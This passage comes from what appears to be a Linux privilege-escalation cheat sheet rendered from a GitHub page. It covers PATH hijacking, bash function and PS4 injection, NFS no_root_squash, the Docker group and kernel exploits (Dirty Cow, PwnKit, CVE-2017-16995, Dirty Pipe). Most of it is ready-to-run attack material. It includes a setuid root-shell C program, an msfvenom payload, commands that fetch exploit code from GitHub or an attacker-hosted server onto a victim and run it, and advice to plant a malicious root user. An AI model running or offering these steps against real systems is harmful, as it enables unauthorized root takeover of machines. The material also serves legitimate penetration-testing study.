\u003ccode\u003estrings\u003c/code\u003e and \u003ccode\u003estrace\u003c/code\u003e, then replace\nthe binary in question with your own:\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ccode\u003ehijack.c\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-c notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"/* Gets root shell\n * Compile (as root):\n * gcc -Wall pwn.c -o pwn \u0026amp;\u0026amp; chmod u+s pwn\n */\n#define _GNU_SOURCE\n#include \u0026lt;stdlib.h\u0026gt;\n#include \u0026lt;unistd.h\u0026gt;\n\nint main() {\n\tsetuid(0);\n\tsetgid(0);\n\tsystem(\u0026quot;/bin/bash -p\u0026quot;);\n  return 0;\n}\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e/* Gets root shell\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * Compile (as root):\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e * gcc -Wall pwn.c -o pwn \u0026amp;\u0026amp; chmod u+s pwn\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e */\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#define\u003c/span\u003e \u003cspan class=\"pl-s1\"\u003e_GNU_SOURCE\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;stdlib.h\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e#include\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u0026lt;unistd.h\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-smi\"\u003eint\u003c/span\u003e \u003cspan class=\"pl-en\"\u003emain\u003c/span\u003e() {\n\t\u003cspan class=\"pl-en\"\u003esetuid\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n\t\u003cspan class=\"pl-en\"\u003esetgid\u003c/span\u003e(\u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e);\n\t\u003cspan class=\"pl-en\"\u003esystem\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e\"/bin/bash -p\"\u003c/span\u003e);\n  \u003cspan class=\"pl-k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e;\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eAnd invoke like so:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# compile\ngcc hijack.c -o hijacked-binary-name\n\n# inject onto PATH\nPATH=.:$PATH victim-binary\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e compile\u003c/span\u003e\ngcc hijack.c -o hijacked-binary-name\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e inject onto PATH\u003c/span\u003e\nPATH=.:\u003cspan class=\"pl-smi\"\u003e$PATH\u003c/span\u003e victim-binary\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eIn \u003ccode\u003ebash\u003c/code\u003e versions less than 4.2-048, you can even do PATH hijacks by exporting\nfunctions that look like valid paths, and will get executed instead of the\nbinary at the real path:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# create a substitute for /usr/sbin/service\nfunction /usr/sbin/service { /bin/bash -p; }\nexport -f /usr/sbin/service\n# then just run victim binary that executes /usr/sbin/service\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create a substitute for /usr/sbin/service\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003e/usr/sbin/service\u003c/span\u003e { /bin/bash -p\u003cspan class=\"pl-k\"\u003e;\u003c/span\u003e }\n\u003cspan class=\"pl-k\"\u003eexport\u003c/span\u003e -f /usr/sbin/service\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e then just run victim binary that executes /usr/sbin/service\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFor bash versions less than 4.4, you can also take advantage of the PS4 env var,\nwhich is used to display debug information (debug mode when \u003ccode\u003eSHELLOPTS=xtrace\u003c/code\u003e).\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2\"\u003e\u003cpre\u003eenv -i SHELLOPTS=xtrace PS4=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e /usr/local/bin/suid-env2\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.6 Using NFS for Privilege Escalation\u003c/h3\u003e\u003ca id=\"user-content-626-using-nfs-for-privilege-escalation\" class=\"anchor\" aria-label=\"Permalink: 6.2.6 Using NFS for Privilege Escalation\" href=\"#626-using-nfs-for-privilege-escalation\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eNFS Shares inherit the \u003cstrong\u003eremote\u003c/strong\u003e user ID, so if root-squashing is disabled,\nsomething owned by root remotely is owned by root locally.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check for NFS with root-squashing disabled (no_root_squash)\ncat /etc/exports\n\n# On Kali box:\nsudo su   # switch to root\nmkdir /tmp/nfs\nmount -o rw,nolock,vers=2 $VICTIM_IP:/share_name /tmp/nfs\n# Note: if mount fails, try without vers=2 option.\nmsfvenom -p linux/x86/exec CMD=\u0026quot;/bin/bash -p\u0026quot; -f elf -o /tmp/nfs/shell.elf\nchmod +xs /tmp/nfs/shell.elf\n\n# on victim machine\n/tmp/shell.elf\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check for NFS with root-squashing disabled (no_root_squash)\u003c/span\u003e\ncat /etc/exports\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e On Kali box:\u003c/span\u003e\nsudo su   \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e switch to root\u003c/span\u003e\nmkdir /tmp/nfs\nmount -o rw,nolock,vers=2 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e:/share_name /tmp/nfs\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Note: if mount fails, try without vers=2 option.\u003c/span\u003e\nmsfvenom -p linux/x86/exec CMD=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e/bin/bash -p\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -f elf -o /tmp/nfs/shell.elf\nchmod +xs /tmp/nfs/shell.elf\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on victim machine\u003c/span\u003e\n/tmp/shell.elf\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.7 Using Docker for Privesc\u003c/h3\u003e\u003ca id=\"user-content-627-using-docker-for-privesc\" class=\"anchor\" aria-label=\"Permalink: 6.2.7 Using Docker for Privesc\" href=\"#627-using-docker-for-privesc\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eThis is possible when the user is a member of the \u003ccode\u003edocker\u003c/code\u003e group.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# mounts the root filesystem into the docker container, and\n# starts an interactive docker shell\ndocker run --rm -it -v /:/mnt --privileged ubuntu bash\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e mounts the root filesystem into the docker container, and\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e starts an interactive docker shell\u003c/span\u003e\ndocker run --rm -it -v /:/mnt --privileged ubuntu bash\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eFrom there, add your ssh key to \u003ccode\u003e/mnt/root/.ssh/authorized_keys\u003c/code\u003e or update the\n\u003ccode\u003e/mnt/etc/passwd\u003c/code\u003e file to include an additional malicious root user.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.8 Linux Kernel Exploits\u003c/h3\u003e\u003ca id=\"user-content-628-linux-kernel-exploits\" class=\"anchor\" aria-label=\"Permalink: 6.2.8 Linux Kernel Exploits\" href=\"#628-linux-kernel-exploits\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e \u003cstrong\u003eNOTE\u003c/strong\u003e: Use LinPEAS to enumerate for kernel vulnerabilities. Searchsploit is often less effective.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.8.1 Dirty Cow\u003c/h4\u003e\u003ca id=\"user-content-6281-dirty-cow\" class=\"anchor\" aria-label=\"Permalink: 6.2.8.1 Dirty Cow\" href=\"#6281-dirty-cow\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-5195\" rel=\"nofollow\"\u003eCVE-2016-5195\u003c/a\u003e is effective against Linux kernels 2.x through 4.x before 4.8.3.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# easiest if g++ avail\nsearchsploit -m 40847\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\n./dcow -s\n\n# Also good:\nsearchsploit -m 40839\n\n# make dirtycow stable\necho 0 \u0026gt; /proc/sys/vm/dirty_writeback_centisecs\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e easiest if g++ avail\u003c/span\u003e\nsearchsploit -m 40847\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\n./dcow -s\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Also good:\u003c/span\u003e\nsearchsploit -m 40839\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e make dirtycow stable\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003eecho\u003c/span\u003e 0 \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e /proc/sys/vm/dirty_writeback_centisecs\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.8.2 PwnKit\u003c/h4\u003e\u003ca id=\"user-content-6282-pwnkit\" class=\"anchor\" aria-label=\"Permalink: 6.2.8.2 PwnKit\" href=\"#6282-pwnkit\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://nvd.nist.gov/vuln/detail/cve-2021-4034\" rel=\"nofollow\"\u003eCVE-2021-4034\u003c/a\u003e PwnKit is effective against many Linux variants:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eUbuntu 10 - Ubuntu 21.10\u003c/li\u003e\n\u003cli\u003eDebian 7 - Debian 11\u003c/li\u003e\n\u003cli\u003eRedHat 6.0 - RedHat 8.4 (and similar Fedora \u0026amp; CentOS versions?)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eAffects pkexec (polkit) \u0026lt; 0.120.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eDetailed vulnerable versions:\u003c/strong\u003e  \u003ca href=\"https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/\" rel=\"nofollow\"\u003ereference\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCheck what's installed with \u003ccode\u003edpkg -s policykit-1\u003c/code\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eUbuntu:\u003c/p\u003e\n\u003cmarkdown-accessiblity-table\u003e\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eUbuntu version\u003c/th\u003e\n\u003cth\u003eLatest vulnerable version\u003c/th\u003e\n\u003cth\u003eFirst fixed version\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e14.04 LTS (Trusty)\u003c/td\u003e\n\u003ctd\u003e0.105-4ubuntu3.14.04.6\u003c/td\u003e\n\u003ctd\u003e0.105-4ubuntu3.14.04.6+esm1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e16.04 LTS (Xenial)\u003c/td\u003e\n\u003ctd\u003e0.105-14.1ubuntu0.5\u003c/td\u003e\n\u003ctd\u003e0.105-14.1ubuntu0.5+esm1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e18.04 LTS (Bionic)\u003c/td\u003e\n\u003ctd\u003e0.105-20\u003c/td\u003e\n\u003ctd\u003e0.105-20ubuntu0.18.04.6\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e20.04 LTS (Focal)\u003c/td\u003e\n\u003ctd\u003e0.105-26ubuntu1.1\u003c/td\u003e\n\u003ctd\u003e0.105-26ubuntu1.2\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/markdown-accessiblity-table\u003e\n\u003cp dir=\"auto\"\u003eDebian:\u003c/p\u003e\n\u003cmarkdown-accessiblity-table\u003e\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eDebian version\u003c/th\u003e\n\u003cth\u003eLatest vulnerable version\u003c/th\u003e\n\u003cth\u003eFirst fixed version\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eStretch\u003c/td\u003e\n\u003ctd\u003e0.105-18+deb9u1\u003c/td\u003e\n\u003ctd\u003e0.105-18+deb9u2\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eBuster\u003c/td\u003e\n\u003ctd\u003e0.105-25\u003c/td\u003e\n\u003ctd\u003e0.105-25+deb10u1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eBullseye\u003c/td\u003e\n\u003ctd\u003e0.105-31\u003c/td\u003e\n\u003ctd\u003e0.105-31+deb11u1\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e(unstable)\u003c/td\u003e\n\u003ctd\u003e0.105-31.1~deb12u1\u003c/td\u003e\n\u003ctd\u003e0.105-31.1\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/markdown-accessiblity-table\u003e\n\u003cp dir=\"auto\"\u003eChecking for vulnerability:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# check suid bit set:\nls -l /usr/bin/pkexec\n\n# check for vulnerable version (see above tables):\ndpkg -s policykit-1\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check suid bit set:\u003c/span\u003e\nls -l /usr/bin/pkexec\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e check for vulnerable version (see above tables):\u003c/span\u003e\ndpkg -s policykit-1\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eExploit:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit\nchmod +x ./pwnkit\n./pwnkit # interactive shell\n./pwnkit 'id' # single command\n# it will tell you nicely if the exploit fails when the system is patched.\"\u003e\u003cpre\u003ecurl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o pwnkit\nchmod +x ./pwnkit\n./pwnkit \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e interactive shell\u003c/span\u003e\n./pwnkit \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eid\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e single command\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e it will tell you nicely if the exploit fails when the system is patched.\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.8.3 Get-Rekt BPF Sign Extension LPE\u003c/h4\u003e\u003ca id=\"user-content-6283-get-rekt-bpf-sign-extension-lpe\" class=\"anchor\" aria-label=\"Permalink: 6.2.8.3 Get-Rekt BPF Sign Extension LPE\" href=\"#6283-get-rekt-bpf-sign-extension-lpe\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-16995\" rel=\"nofollow\"\u003eCVE-2017-16995\u003c/a\u003e is effective against Linux kernel 4.4.0 - 4.14.10.\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eDebian 9\u003c/li\u003e\n\u003cli\u003eUbuntu 14.04 - 16.04\u003c/li\u003e\n\u003cli\u003eMint 17 - 18\u003c/li\u003e\n\u003cli\u003eFedora 25 - 27\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# on kali, grab source\nsearchsploit -m 45010\npython -m http.server 80\n\n# on victim, download, compile, and execute\nwget LISTEN_IP/45010.c -O cve-2017-16995\ngcc cve-2017-16995.c -o cve-2017-16995\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on kali, grab source\u003c/span\u003e\nsearchsploit -m 45010\npython -m http.server 80\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e on victim, download, compile, and execute\u003c/span\u003e\nwget LISTEN_IP/45010.c -O cve-2017-16995\ngcc cve-2017-16995.c -o cve-2017-16995\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch4 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e6.2.8.4 Dirty Pipe\u003c/h4\u003e\u003ca id=\"user-content-6284-dirty-pipe\" class=\"anchor\" aria-label=\"Permalink: 6.2.8.4 Dirty Pipe\" href=\"#6284-dirty-pipe\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-0847\" rel=\"nofollow\"\u003eCVE-2022-0847\u003c/a\u003e affects Linux kernels 5.8.x up. The vulnerability was fixed in Linux 5.16.11, 5.15.25 and 5.10.102.\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eUbuntu 20.04 - 21.04\u003c/li\u003e\n\u003cli\u003eDebian 11\u003c/li\u003e\n\u003cli\u003eRHEL 8.0 - 8.4\u003c/li\u003e\n\u003cli\u003eFedora 35\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"wget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c\npython -m http.server 80\n\n# on victim\nwget LISTEN_IP/exploit.c\ngcc exploit.c -o exploit # may need to compile locally with \u0026quot;-static\u0026quot;\n./exploit # if statically compiled, may complain about system() failing, but might be ok\n\n# check if exploit worked\ngrep root /etc/passwd # should see hash with 'aaron' salt\n\n# become r00t\nsu - # use password 'aaron'\n\n# to restore to pre-exploit state\n# if you get error \u0026quot;su: must be run from a terminal\u0026quot;\n# or error \u0026quot;system() function call seems to have failed :(\u0026quot;\n# but the exploit successfully changed root's password in /etc/passwd\n# - login as root with the password aaron.\n# - restore /etc/passwd\nmv /tmp/passwd.bak /etc/passwd\"\u003e\u003cpre\u003ewget https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c\npython -m http.server 80\n\n\u003cspan 